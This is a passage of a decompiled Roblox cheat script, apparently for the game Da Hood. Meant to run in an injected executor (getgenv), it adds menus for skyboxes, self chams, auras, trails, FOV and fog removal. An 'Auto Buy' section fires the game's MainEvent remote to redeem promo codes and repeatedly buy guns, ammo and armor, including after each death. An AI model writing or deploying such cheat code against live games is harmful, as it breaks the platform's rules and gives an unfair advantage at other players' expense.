		sb = ({
			["Rainy"] = {
				["Bk"] = 1666456837,
				["Dn"] = 1666455881,
				["Ft"] = 1666457447,
				["Lf"] = 1666455318,
				["Rt"] = 1666456385,
				["Up"] = 1666458034
			},
			["Space v2"] = {
				["Bk"] = 76948125119932,
				["Dn"] = 117865148129754,
				["Ft"] = 77181996912050,
				["Lf"] = 130317898320211,
				["Rt"] = 105669495538162,
				["Up"] = 128363212769327
			},
			["Dahood"] = {
				["Bk"] = 600830446,
				["Dn"] = 600831635,
				["Ft"] = 600832720,
				["Lf"] = 600886090,
				["Rt"] = 600833862,
				["Up"] = 600835177
			},
			["Cosmo"] = {
				["Bk"] = 15753305495,
				["Dn"] = 15753362674,
				["Ft"] = 15753305823,
				["Lf"] = 15753310707,
				["Rt"] = 15753304774,
				["Up"] = 15753304473
			},
			["Neon"] = {
				["Bk"] = 271042516,
				["Dn"] = 271077243,
				["Ft"] = 271042556,
				["Lf"] = 271042310,
				["Rt"] = 271042467,
				["Up"] = 271077958
			},
			["Minecraft"] = {
				["Bk"] = 1876545003,
				["Dn"] = 1876544331,
				["Ft"] = 1876542941,
				["Lf"] = 1876543392,
				["Rt"] = 1876543764,
				["Up"] = 1876544642
			},
			["Old skybox"] = {
				["Bk"] = 15436783,
				["Dn"] = 15436796,
				["Ft"] = 15436831,
				["Lf"] = 15437157,
				["Rt"] = 15437166,
				["Up"] = 15437184
			},
			["Nightless"] = {
				["Bk"] = 48020371,
				["Dn"] = 48020144,
				["Ft"] = 48020234,
				["Lf"] = 48020211,
				["Rt"] = 48020254,
				["Up"] = 48020383
			}
		})[p1415]
		if sb then
			sky.SkyboxBk = "rbxassetid://" .. sb.Bk
			sky.SkyboxDn = "rbxassetid://" .. sb.Dn
			sky.SkyboxFt = "rbxassetid://" .. sb.Ft
			sky.SkyboxLf = "rbxassetid://" .. sb.Lf
			sky.SkyboxRt = "rbxassetid://" .. sb.Rt
			sky.SkyboxUp = "rbxassetid://" .. sb.Up
		end
		sky.Parent = v_u_1381
	end
	v_u_1381.ClockTime = 12
end
function applyCustomSky()
	-- upvalues: (ref) v_u_1381
	local v1421 = v_u_1381
	local v1422, v1423, v1424 = pairs(v1421:GetChildren())
	while true do
		local v1425
		v1424, v1425 = v1422(v1423, v1424)
		if v1424 == nil then
			break
		end
		if v1425:IsA("Sky") then
			v1425:Destroy()
		end
	end
	sky = Instance.new("Sky")
	sky.SkyboxBk = customSky.Bk
	sky.SkyboxDn = customSky.Dn
	sky.SkyboxFt = customSky.Ft
	sky.SkyboxLf = customSky.Lf
	sky.SkyboxRt = customSky.Rt
	sky.SkyboxUp = customSky.Up
	sky.Parent = v_u_1381
end
v1383:AddDropdown("SkyboxDropdown", {
	["Values"] = {
		"Default",
		"Rainy",
		"Space v2",
		"Dahood",
		"Cosmo",
		"Neon",
		"Minecraft",
		"Nightless",
		"Old skybox"
	},
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Skybox",
	["IgnoreCallbackOnConfigLoad"] = true,
	["Callback"] = function(p1426)
		selectedSkybox = p1426
	end
})
v1383:AddInput("SkyboxBk", {
	["Text"] = "Skybox Back (Bk)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1427)
		customSky.Bk = p1427
	end
})
v1383:AddInput("SkyboxDn", {
	["Text"] = "Skybox Down (Dn)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1428)
		customSky.Dn = p1428
	end
})
v1383:AddInput("SkyboxFt", {
	["Text"] = "Skybox Front (Ft)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1429)
		customSky.Ft = p1429
	end
})
v1383:AddInput("SkyboxLf", {
	["Text"] = "Skybox Left (Lf)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1430)
		customSky.Lf = p1430
	end
})
v1383:AddInput("SkyboxRt", {
	["Text"] = "Skybox Right (Rt)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1431)
		customSky.Rt = p1431
	end
})
v1383:AddInput("SkyboxUp", {
	["Text"] = "Skybox Up (Up)",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1432)
		customSky.Up = p1432
	end
})
v1383:AddButton("Apply Selected Skybox", function()
	applySkybox(selectedSkybox)
end)
v1383:AddButton("Apply Custom Skybox", function()
	applyCustomSky()
end)
rainbowUpdate = 0
v_u_1212.Heartbeat:Connect(function(p1433)
	-- upvalues: (ref) v_u_1381
	rainbowUpdate = rainbowUpdate + p1433
	if rainbowUpdate >= 0.1 then
		rainbowUpdate = 0
		if rainbowLighting then
			hue = tick() * 30 % 360 / 360
			color = Color3.fromHSV(hue, 1, 1)
			v_u_1381.Ambient = color
			v_u_1381.OutdoorAmbient = color
		else
			v_u_1381.Ambient = Color3.fromRGB(128, 128, 128)
			v_u_1381.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end
	end
	if timeControlEnabled and v_u_1381.ClockTime ~= currentGameTime then
		setGameTime(currentGameTime)
	end
end)
local v1434 = v24:AddRightGroupbox("Self Chams")
local v_u_1435 = {
	["UISettings"] = {
		["Rainbow"] = false
	},
	["Visuals"] = {
		["Local"] = {
			["Chams"] = nil,
			["ChamsColor"] = Color3.fromRGB(255, 255, 255),
			["OriginalColors"] = {},
			["CloneChams"] = {
				["Enabled"] = nil,
				["Duration"] = nil,
				["Color"] = nil,
				["Material"] = nil
			},
			["GunChams"] = {
				["Enabled"] = nil,
				["Color"] = nil
			}
		}
	}
}
v1434:AddToggle("ChamsEnabledTggle", {
	["Text"] = "Enable",
	["Default"] = false
})
Toggles.ChamsEnabledTggle:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.Chams = Toggles.ChamsEnabledTggle.Value
end)
Toggles.ChamsEnabledTggle:AddColorPicker("ChamsMainColor", {
	["Default"] = Color3.fromRGB(255, 255, 255),
	["Title"] = "Chams Color"
})
Options.ChamsMainColor:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.ChamsColor = Options.ChamsMainColor.Value
end)
v1434:AddToggle("GunChamsTggle", {
	["Text"] = "Tool",
	["Default"] = false
})
v1434:AddToggle("CloneChamsEnabled", {
	["Text"] = "Clone",
	["Default"] = false
})
Toggles.CloneChamsEnabled:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.CloneChams.Enabled = Toggles.CloneChamsEnabled.Value
end)
Toggles.CloneChamsEnabled:AddColorPicker("CloneChamsColor", {
	["Default"] = Color3.fromRGB(255, 255, 255),
	["Title"] = "Clone Chams Color"
})
Options.CloneChamsColor:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.CloneChams.Color = Options.CloneChamsColor.Value
end)
v1434:AddSlider("DurationSliderWHAT", {
	["Text"] = "Duration",
	["Default"] = 1,
	["Min"] = 1,
	["Max"] = 3,
	["Rounding"] = 2,
	["Compact"] = false
})
Options.DurationSliderWHAT:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.CloneChams.Duration = Options.DurationSliderWHAT.Value
end)
v1434:AddDropdown("CloneChamsMaterial", {
	["Values"] = { "Neon", "ForceField", "Plastic" },
	["Default"] = 2,
	["Multi"] = false,
	["Text"] = "Clone Chams Material"
})
Options.CloneChamsMaterial:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.CloneChams.Material = Options.CloneChamsMaterial.Value
end)
Toggles.GunChamsTggle:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.GunChams.Enabled = Toggles.GunChamsTggle.Value
end)
Toggles.GunChamsTggle:AddColorPicker("GunChamsColr", {
	["Default"] = Color3.fromRGB(255, 255, 255),
	["Title"] = "Gun Chams Color"
})
Options.GunChamsColr:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.Visuals.Local.GunChams.Color = Options.GunChamsColr.Value
end)
v1434:AddToggle("RainbowToggle", {
	["Text"] = "Rainbow",
	["Default"] = false
})
Toggles.RainbowToggle:OnChanged(function()
	-- upvalues: (ref) v_u_1435
	v_u_1435.UISettings.Rainbow = Toggles.RainbowToggle.Value
end)
local function v_u_1437(p1436)
	return Color3.fromHSV((tick() + (p1436 or 0)) % 5 / 5, 1, 1)
end
task.spawn(function()
	-- upvalues: (ref) v_u_1435, (ref) v_u_1437
	while true do
		repeat
			wait()
			local v1438 = game.Players.LocalPlayer.Character
		until v1438
		if v_u_1435.Visuals.Local.Chams then
			local v1439, v1440, v1441 = pairs(v1438:GetDescendants())
			while true do
				local v1442
				v1441, v1442 = v1439(v1440, v1441)
				if v1441 == nil then
					break
				end
				if v1442:IsA("BasePart") then
					if not v_u_1435.Visuals.Local.OriginalColors[v1442] then
						v_u_1435.Visuals.Local.OriginalColors[v1442] = {
							["Color"] = v1442.Color,
							["Material"] = v1442.Material
						}
					end
					v1442.Material = "ForceField"
					v1442.Color = v_u_1435.UISettings.Rainbow and v_u_1437() or v_u_1435.Visuals.Local.ChamsColor
				end
			end
		else
			local v1443, v1444, v1445 = pairs(v_u_1435.Visuals.Local.OriginalColors)
			while true do
				local v1446
				v1445, v1446 = v1443(v1444, v1445)
				if v1445 == nil then
					break
				end
				if v1445 and v1445.Parent then
					v1445.Color = v1446.Color
					v1445.Material = v1446.Material
				end
			end
		end
	end
end)
task.spawn(function()
	-- upvalues: (ref) v_u_1435, (ref) v_u_1437
	::l0::
	repeat
		repeat
			wait()
		until v_u_1435.Visuals.Local.CloneChams.Enabled
		local v1447 = game.Players.LocalPlayer
	until v1447.Character
	v1447.Character.Archivable = true
	local v1448 = v1447.Character:Clone()
	local v1449 = next
	local v1450, v1451 = v1448:GetDescendants()
	goto l5
	::l6::
	if v_u_1452.Name == "HumanoidRootPart" or (v_u_1452:IsA("Humanoid") or (v_u_1452:IsA("LocalScript") or (v_u_1452:IsA("Script") or v_u_1452:IsA("Decal")))) then
		v_u_1452:Destroy()
	elseif v_u_1452:IsA("BasePart") or (v_u_1452:IsA("Meshpart") or v_u_1452:IsA("Part")) then
		if v_u_1452.Transparency ~= 1 then
			v_u_1452.CanCollide = false
			v_u_1452.Anchored = true
			v_u_1452.Material = v_u_1435.Visuals.Local.CloneChams.Material
			v_u_1452.Color = v_u_1435.UISettings.Rainbow and v_u_1437(1) or v_u_1435.Visuals.Local.CloneChams.Color
			v_u_1452.Transparency = 0
			v_u_1452.Size = v_u_1452.Size + Vector3.new(0.03, 0.03, 0.03)
		else
			v_u_1452:Destroy()
		end
	end
	pcall(function()
		-- upvalues: (ref) v_u_1452
		v_u_1452.CanCollide = false
	end)
	::l5::
	local v_u_1452
	v1451, v_u_1452 = v1449(v1450, v1451)
	if v1451 ~= nil then
		goto l6
	else
		goto l34
	end
	::l34::
	v1448.Parent = game.Workspace
	wait(v_u_1435.Visuals.Local.CloneChams.Duration)
	v1448:Destroy()
	if v_u_1435.Visuals.Local.CloneChams.Enabled then
		return
	end
	goto l0
end)
task.spawn(function()
	-- upvalues: (ref) v_u_1435, (ref) v_u_1437
	while true do
		repeat
			wait()
			local v1453 = game.Players.LocalPlayer
		until v1453.Character
		local v1454 = v1453.Character:FindFirstChildWhichIsA("Tool")
		if v_u_1435.Visuals.Local.GunChams.Enabled then
			if v1454 and v1454:FindFirstChild("Default") then
				v1454.Default.Material = "ForceField"
				v1454.Default.Color = v_u_1435.UISettings.Rainbow and v_u_1437(2) or v_u_1435.Visuals.Local.GunChams.Color
			end
		elseif v1454 and v1454:FindFirstChild("Default") then
			v1454.Default.Material = "Plastic"
		end
	end
end)
AuraVisualGroup = v24:AddRightGroupbox("Effects")
local v_u_1455 = v_u_1211.LocalPlayer
character = v_u_1455.Character or v_u_1455.CharacterAdded:Wait()
angelAuraModel = nil
cloakAuraModel = nil
sweetHearthModel = nil
etherealAuraModel = nil
selectedAura = "Angel Aura"
auraEnabled = false
function clearAuras()
	local v1456, v1457, v1458 = pairs({
		angelAuraModel,
		cloakAuraModel,
		sweetHearthModel,
		etherealAuraModel
	})
	while true do
		local v1459
		v1458, v1459 = v1456(v1457, v1458)
		if v1458 == nil then
			break
		end
		if v1459 then
			v1459:Destroy()
		end
	end
	etherealAuraModel = nil
	sweetHearthModel = nil
	cloakAuraModel = nil
	angelAuraModel = nil
end
function attachModel(p_u_1460)
	local v1461 = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
	if not v1461 then
		warn("Torso not found")
		return nil
	end
	local v1462, v1463 = pcall(function()
		-- upvalues: (ref) p_u_1460
		return game:GetObjects("rbxassetid://" .. p_u_1460)[1]
	end)
	if not (v1462 and v1463) then
		warn("Failed to load model with ID:", p_u_1460)
		return nil
	end
	v1463.Parent = character
	if not v1463:IsA("Accessory") then
		local v1464, v1465, v1466 = ipairs(v1463:GetDescendants())
		while true do
			local v1467
			v1466, v1467 = v1464(v1465, v1466)
			if v1466 == nil then
				break
			end
			if v1467:IsA("BasePart") then
				v1467.CanCollide = false
				v1467.Massless = true
				v1467.Anchored = false
				v1467.CanTouch = false
				v1467.CanQuery = false
			end
		end
		if v1463:IsA("Model") then
			v1463:PivotTo(v1461.CFrame)
			local v1468, v1469, v1470 = ipairs(v1463:GetDescendants())
			while true do
				local v1471
				v1470, v1471 = v1468(v1469, v1470)
				if v1470 == nil then
					break
				end
				if v1471:IsA("BasePart") then
					local v1472 = Instance.new("Motor6D")
					v1472.Part0 = v1461
					v1472.Part1 = v1471
					v1472.C0 = v1461.CFrame:ToObjectSpace(v1471.CFrame)
					v1472.Parent = v1461
				end
			end
		elseif v1463:IsA("BasePart") then
			v1463.CFrame = v1461.CFrame
			local v1473 = Instance.new("Motor6D")
			v1473.Part0 = v1461
			v1473.Part1 = v1463
			v1473.C0 = v1461.CFrame:ToObjectSpace(v1463.CFrame)
			v1473.Parent = v1461
		end
		return v1463
	end
	local v1474 = character:FindFirstChildWhichIsA("Humanoid")
	if v1474 then
		v1474:AddAccessory(v1463)
		return v1463
	end
	warn("Humanoid not found to add accessory")
	v1463:Destroy()
	return nil
end
function enableAngelAura()
	angelAuraModel = attachModel(90022969696073)
end
function enableCloakAura()
	cloakAuraModel = attachModel(99046723611000)
end
function enableSweetHearth()
	sweetHearthModel = attachModel(91724768175470)
end
function enableEtherealAura()
	etherealAuraModel = attachModel(97041568674250)
end
function updateAura()
	clearAuras()
	if auraEnabled then
		if selectedAura ~= "Angel Aura" then
			if selectedAura ~= "Cloak Aura" then
				if selectedAura ~= "Sweet Hearth" then
					if selectedAura == "Ethereal" then
						enableEtherealAura()
					end
				else
					enableSweetHearth()
				end
			else
				enableCloakAura()
			end
		else
			enableAngelAura()
		end
	end
end
v_u_1455.CharacterAdded:Connect(function(p1475)
	character = p1475
	p1475:WaitForChild("Humanoid", 5)
	p1475:WaitForChild("UpperTorso", 5)
	task.wait(1)
	updateAura()
end)
AuraVisualGroup:AddToggle("AuraToggle", {
	["Text"] = "Enable",
	["Default"] = auraEnabled,
	["Callback"] = function(p1476)
		auraEnabled = p1476
		updateAura()
	end
})
AuraVisualGroup:AddDropdown("AuraDropdown", {
	["Text"] = "Select Aura",
	["Default"] = selectedAura,
	["Values"] = {
		"Angel Aura",
		"Cloak Aura",
		"Sweet Hearth",
		"Ethereal"
	},
	["Callback"] = function(p1477)
		selectedAura = p1477
		updateAura()
	end
})
Settings = {
	["Visuals"] = {
		["SelfESP"] = {
			["Trail"] = {
				["Color"] = Color3.fromRGB(255, 110, 0),
				["Color2"] = Color3.fromRGB(255, 0, 0),
				["LifeTime"] = 1.6,
				["Width"] = 0.1
			},
			["Aura"] = {
				["Color"] = Color3.fromRGB(152, 0, 252)
			}
		}
	}
}
utility = {}
function utility.trail_character(p1478)
	-- upvalues: (ref) v_u_1455
	character = v_u_1455.Character or v_u_1455.CharacterAdded:Wait()
	humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	if p1478 then
		if not humanoidRootPart:FindFirstChild("BlaBla") then
			BlaBla = Instance.new("Trail", humanoidRootPart)
			BlaBla.Name = "BlaBla"
			humanoidRootPart.Material = Enum.Material.Neon
			attachment0 = Instance.new("Attachment", humanoidRootPart)
			attachment0.Position = Vector3.new(0, 1, 0)
			attachment1 = Instance.new("Attachment", humanoidRootPart)
			attachment1.Position = Vector3.new(0, -1, 0)
			BlaBla.Attachment0 = attachment0
			BlaBla.Attachment1 = attachment1
			BlaBla.Color = ColorSequence.new(Settings.Visuals.SelfESP.Trail.Color, Settings.Visuals.SelfESP.Trail.Color2)
			BlaBla.Lifetime = Settings.Visuals.SelfESP.Trail.LifeTime
			BlaBla.Transparency = NumberSequence.new(0, 0)
			BlaBla.LightEmission = 0.2
			BlaBla.Brightness = 10
			BlaBla.WidthScale = NumberSequence.new({ NumberSequenceKeypoint.new(0, Settings.Visuals.SelfESP.Trail.Width), NumberSequenceKeypoint.new(1, 0) })
		end
	else
		children = humanoidRootPart:GetChildren()
		for v1479 = 1, #children do
			if children[v1479]:IsA("Trail") then
				if children[v1479].Name == "BlaBla" then
					children[v1479]:Destroy()
				end
			end
		end
	end
end
v907 = function(_)
	if getgenv().trailEnabled then
		utility.trail_character(true)
	end
end
v_u_1455.CharacterAdded:Connect(v907)
if v_u_1455.Character then
	v907(v_u_1455.Character)
end
AuraVisualGroup:AddToggle("TrailToggle", {
	["Text"] = "Trail",
	["Default"] = false,
	["Callback"] = function(p1480)
		getgenv().trailEnabled = p1480
		utility.trail_character(p1480)
	end
}):AddColorPicker("TrailColor", {
	["Text"] = "Trail Color",
	["Default"] = Settings.Visuals.SelfESP.Trail.Color,
	["Callback"] = function(p1481)
		Settings.Visuals.SelfESP.Trail.Color = p1481
		if getgenv().trailEnabled then
			utility.trail_character(false)
			utility.trail_character(true)
		end
	end
}):AddColorPicker("TrailColor2", {
	["Text"] = "Trail Color 2",
	["Default"] = Settings.Visuals.SelfESP.Trail.Color2,
	["Callback"] = function(p1482)
		Settings.Visuals.SelfESP.Trail.Color2 = p1482
		if getgenv().trailEnabled then
			utility.trail_character(false)
			utility.trail_character(true)
		end
	end
})
AuraVisualGroup:AddSlider("TrailLifetime", {
	["Text"] = "Trail Lifetime",
	["Default"] = 1.6,
	["Min"] = 0.1,
	["Max"] = 5,
	["Rounding"] = 1,
	["Callback"] = function(p1483)
		Settings.Visuals.SelfESP.Trail.LifeTime = p1483
		if getgenv().trailEnabled then
			utility.trail_character(false)
			utility.trail_character(true)
		end
	end
})
camera = workspace.CurrentCamera
defaultFOV = camera.FieldOfView
fovEnabled = false
currentFOV = defaultFOV
FOVGroup = v24:AddRightGroupbox("Field of View")
FOVGroup:AddToggle("EnableFOV", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1484)
		fovEnabled = p1484
		if fovEnabled then
			camera.FieldOfView = currentFOV
		else
			camera.FieldOfView = defaultFOV
		end
	end
})
FOVGroup:AddSlider("FOVSlider", {
	["Text"] = "Amount",
	["Default"] = defaultFOV,
	["Min"] = 70,
	["Max"] = 120,
	["Rounding"] = 1,
	["Compact"] = false,
	["Callback"] = function(p1485)
		currentFOV = p1485
		if fovEnabled then
			camera.FieldOfView = currentFOV
		end
	end
})
FoggGroup = v24:AddRightGroupbox("Fog")
fogEnabled = false
rainbowFog = false
fogStart = 0
fogEnd = 1000
hue = 0
fogColor = Color3.new(1, 1, 1)
originalFogStart = game.Lighting.FogStart
originalFogEnd = game.Lighting.FogEnd
originalFogColor = game.Lighting.FogColor
function updateFog()
	if fogEnabled then
		game.Lighting.FogStart = fogStart
		game.Lighting.FogEnd = fogEnd
		if rainbowFog then
			hue = (hue + 1) % 360
			game.Lighting.FogColor = Color3.fromHSV(hue / 360, 1, 1)
		else
			game.Lighting.FogColor = fogColor
		end
	else
		game.Lighting.FogStart = originalFogStart
		game.Lighting.FogEnd = originalFogEnd
		game.Lighting.FogColor = originalFogColor
	end
end
fogToggle = FoggGroup:AddToggle("EnableFog", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1486)
		fogEnabled = p1486
		updateFog()
	end
})
fogToggle:AddColorPicker("FogColorPicker", {
	["Default"] = fogColor,
	["Title"] = "Fog Color",
	["Callback"] = function(p1487)
		fogColor = p1487
		if fogEnabled and not rainbowFog then
			updateFog()
		end
	end
})
FoggGroup:AddToggle("RainbowFog", {
	["Text"] = "Rainbow",
	["Default"] = false,
	["Callback"] = function(p1488)
		rainbowFog = p1488
		updateFog()
	end
})
FoggGroup:AddToggle("RemoveFog", {
	["Text"] = "Remove Fog",
	["Callback"] = function(p1489)
		if p1489 then
			game.Lighting.FogEnd = 1000000
			game.Lighting.FogStart = 100
		else
			game.Lighting.FogEnd = fogEnd
			game.Lighting.FogStart = fogStart
		end
	end
})
FoggGroup:AddSlider("FogStart", {
	["Text"] = "Start",
	["Default"] = fogStart,
	["Min"] = 0,
	["Max"] = 1000,
	["Rounding"] = 0,
	["Callback"] = function(p1490)
		fogStart = p1490
		updateFog()
	end
})
FoggGroup:AddSlider("FogEnd", {
	["Text"] = "End",
	["Default"] = fogEnd,
	["Min"] = 0,
	["Max"] = 1000,
	["Rounding"] = 0,
	["Callback"] = function(p1491)
		fogEnd = p1491
		updateFog()
	end
})
game:GetService("RunService").RenderStepped:Connect(function()
	if fogEnabled and rainbowFog then
		updateFog()
	end
end)
getgenv().Lighting = game:GetService("Lighting")
getgenv().DefaultAmbient = v_u_1381.Ambient
getgenv().DefaultTechnology = v_u_1381.Technology.Name
FoggGroup:AddToggle("AmbientToggle", {
	["Text"] = "Ambient",
	["Default"] = false,
	["Callback"] = function(p1492)
		-- upvalues: (ref) v_u_1381
		if p1492 then
			v_u_1381.Ambient = getgenv().AmbientColor or DefaultAmbient
		else
			v_u_1381.Ambient = DefaultAmbient
		end
	end
}):AddColorPicker("AmbientColor", {
	["Default"] = DefaultAmbient,
	["Title"] = "Ambient Color",
	["Callback"] = function(p1493)
		-- upvalues: (ref) v_u_1381
		getgenv().AmbientColor = p1493
		v_u_1381.Ambient = p1493
	end
})
FoggGroup:AddDropdown("LightingTech", {
	["Text"] = "Technology",
	["Values"] = {
		"Voxel",
		"Compatibility",
		"ShadowMap",
		"Future"
	},
	["Default"] = table.find({
		"Voxel",
		"Compatibility",
		"ShadowMap",
		"Future"
	}, DefaultTechnology) or 1,
	["Callback"] = function(p1494)
		-- upvalues: (ref) v_u_1381
		v_u_1381.Technology = Enum.Technology[p1494]
	end
})
game:GetService("RunService").RenderStepped:Connect(function()
	if rainbowMode and (toggleHP or (toggleArmor or toggleEnergy)) then
		skibiditoilet()
	end
end)
Ignored = v_u_1037:FindFirstChild("Ignored")
local v1495 = Ignored
if v1495 then
	v1495 = Ignored:FindFirstChild("Shop")
end
ShopFolder = v1495
isValidGame = false
local v_u_1496, v_u_1497, v_u_1498
if ShopFolder then
	neededItems = {
		"[Rifle] - $1694",
		"[Medium Armor] - $1366",
		"[Pizza] - $11",
		"[Surgeon Mask] - 27$",
		"[Bat] - 300$"
	}
	index = 1
	v_u_1496 = v_u_1211
	v_u_1497 = v_u_1210
	v_u_1498 = v_u_1203
	while index <= #neededItems do
		itemName = neededItems[index]
		if ShopFolder:FindFirstChild(itemName) then
			isValidGame = true
			break
		end
		index = index + 1
	end
else
	v_u_1496 = v_u_1211
	v_u_1497 = v_u_1210
	v_u_1498 = v_u_1203
end
local v1499 = v26:AddLeftTabbox()
v_u_1201 = v1499:AddTab("Auto Buy")
local v1500 = v1499:AddTab("Auto Farm")
local v1501 = v_u_1201
v_u_1201.AddLabel(v1501, "[Money Method] use this button")
local v1502 = v_u_1201
webhook = v_u_1201.AddButton(v1502, "Redeem Codes", function()
	-- upvalues: (ref) v_u_2
	codes = { "HALLOWEEN25", "ADMINABUSE" }
	mainEvent = game:GetService("ReplicatedStorage"):WaitForChild("MainEvent") or nil
	i = 1
	while i <= #codes do
		code = codes[i]
		mainEvent:FireServer("EnterPromoCode", code)
		v_u_2:Notify("Redeeming " .. code, 1)
		task.wait(4.2)
		i = i + 1
	end
end)
autoAfterDie = false
local v1503 = v_u_1201
v_u_1201.AddToggle(v1503, "AutoAfterDie", {
	["Text"] = "Auto After Die",
	["Default"] = false,
	["Callback"] = function(p1504)
		autoAfterDie = p1504
	end
})
function HasItem(p1505)
	-- upvalues: (ref) v_u_1214
	local v1506 = v_u_1214:FindFirstChild("Backpack")
	local v1507 = v_u_1214.Character
	if v1506 then
		local v1508, v1509, v1510 = ipairs(v1506:GetChildren())
		while true do
			local v1511
			v1510, v1511 = v1508(v1509, v1510)
			if v1510 == nil then
				break
			end
			if v1511.Name == p1505 then
				return true
			end
		end
	end
	if v1507 then
		local v1512, v1513, v1514 = ipairs(v1507:GetChildren())
		while true do
			local v1515
			v1514, v1515 = v1512(v1513, v1514)
			if v1514 == nil then
				break
			end
			if v1515:IsA("Tool") and v1515.Name == p1505 then
				return true
			end
		end
	end
	return false
end
function TryBuyItem(p1516, p1517, p1518)
	local v1519 = p1518 or 0.7
	for _ = 1, p1517 or 3 do
		BuyItem(p1516)
		task.wait(v1519)
		if HasItem(p1516) then
			return true
		end
	end
	return false
end
function AutoBuySelectedItems()
	if SelectedGun and not HasItem(SelectedGun) then
		TryBuyItem(SelectedGun, 3, 0.7)
	end
	if SelectedAmmo then
		for _ = 1, 5 do
			TryBuyItem(SelectedAmmo, 2, 0.5)
		end
	end
	if SelectedArmor and not HasItem(SelectedArmor) then
		TryBuyItem(SelectedArmor, 2, 1)
		task.wait(4)
	end
end
v_u_1214.CharacterAdded:Connect(function(_)
	task.wait(3)
	if autoAfterDie then
		AutoBuySelectedItems()
	end
end)
Guns = {
	"[Rifle] - $1694",
	"[AUG] - $2131",
	"[Flintlock] - $1421",
	"[Revolver] - $1421",
	"[SilencerAR] - $1366",
	"[Double-Barrel SG] - $1475",
	"[TacticalShotgun] - $1912",
	"[P90] - $1093",
	"[RPG] - $21855",
	"[Flamethrower] - $9835",
	"[LMG] - $4098",
	"[Drum-Shotgun] - $1202",
	"[DrumGun] - $3278",
	"[GrenadeLauncher] - $10927",
	"[Taser] - $1093"
}
Ammo = {
	"5 [Rifle Ammo] - $273",
	"90 [AUG Ammo] - $87",
	"6 [Flintlock Ammo] - $163",
	"12 [Revolver Ammo] - $82",
	"120 [SilencerAR Ammo] - $82",
	"18 [Double-Barrel SG Ammo] - $55",
	"20 [TacticalShotgun Ammo] - $66",
	"120 [P90 Ammo] - $66",
	"5 [RPG Ammo] - $1093 ",
	"140 [Flamethrower Ammo] - $1093",
	"200 [LMG Ammo] - $328",
	"18 [Drum-Shotgun Ammo] - $71",
	"100 [DrumGun Ammo] - $219",
	"12 [GrenadeLauncher Ammo] - $3278"
}
Armors = { "[Medium Armor] - $1366", "[High-Medium Armor] - $2513", "[Fire Armor] - $2623" }
Foods = {
	"[Pizza] - $11",
	"[Hamburger] - $11",
	"[Popcorn] - $8",
	"[Donut] - $11",
	"[Chicken] - $8",
	"[Pizza] - $5",
	"[Taco] - $2",
	"[Starblox Latte] - $5",
	"[Cranberry] - $3"
}
Mask = {
	"[Surgeon Mask] - $27",
	"[Skull Mask] - $66",
	"[Pumpkin Mask] - $66",
	"[Hockey Mask] - $66",
	"[Paintball Mask] - $66",
	"[Ninja Mask] - $66",
	"[Riot Mask] - $66"
}
Item = {
	"[SledgeHammer] - $382",
	"[Bat] - $300",
	"[StopSign] - $328",
	"[Shovel] - $350",
	"[Pitchfork] - $350",
	"[Knife] - $164",
	"[PepperSpray] - $82",
	"[LockPicker] - $137",
	"[Key] - $137",
	"[Firework] - $10927"
}
SelectedGun = Guns[1]
SelectedAmmo = Ammo[1]
SelectedArmor = Armors[1]
SelectedFood = Foods[1]
SelectedMask = Mask[1]
SelectedItem = Item[1]
Debounce = false
function GetCharacterRoot()
	-- upvalues: (ref) v_u_1214
	char = v_u_1214.Character
	if char then
		return char:FindFirstChild("HumanoidRootPart")
	else
		return nil
	end
end
local v1520 = v_u_1201
v_u_1201.AddDropdown(v1520, "GunDropdown", {
	["Values"] = Guns,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Gun",
	["Callback"] = function(p1521)
		SelectedGun = p1521
		if p1521 == "[Rifle] - $1694" then
			SelectedAmmo = "5 [Rifle Ammo] - $273"
		end
		if p1521 == "[AUG] - $2131" then
			SelectedAmmo = "90 [AUG Ammo] - $87"
		end
		if p1521 == "[Flintlock] - $1421" then
			SelectedAmmo = "6 [Flintlock Ammo] - $163"
		end
		if p1521 == "[Revolver] - $1421" then
			SelectedAmmo = "12 [Revolver Ammo] - $82"
		end
		if p1521 == "[SilencerAR] - $1366" then
			SelectedAmmo = "120 [SilencerAR Ammo] - $82"
		end
		if p1521 == "[Double-Barrel SG] - $1475" then
			SelectedAmmo = "18 [Double-Barrel SG Ammo] - $55"
		end
		if p1521 == "[TacticalShotgun] - $1912" then
			SelectedAmmo = "20 [TacticalShotgun Ammo] - $66"
		end
		if p1521 == "[P90] - $1093" then
			SelectedAmmo = "120 [P90 Ammo] - $66"
		end
		if p1521 == "[RPG] - $21855" then
			SelectedAmmo = "5 [RPG Ammo] - $1093"
		end
		if p1521 == "[Flamethrower] - $9835" then
			SelectedAmmo = "140 [Flamethrower Ammo] - $1093"
		end
		if p1521 == "[LMG] - $4098" then
			SelectedAmmo = "200 [LMG Ammo] - $328"
		end
		if p1521 == "[Drum-Shotgun] - $1202" then
			SelectedAmmo = "18 [Drum-Shotgun Ammo] - $71"
		end
		if p1521 == "[DrumGun] - $3278" then
			SelectedAmmo = "100 [DrumGun Ammo] - $219"
		end
		if p1521 == "[GrenadeLauncher] - $10927" then
			SelectedAmmo = "12 [GrenadeLauncher Ammo] - $3278"
		end
		if p1521 == "[Taser] - $1093" then
			SelectedAmmo = ""
		end
	end
})
local v1522 = v_u_1201
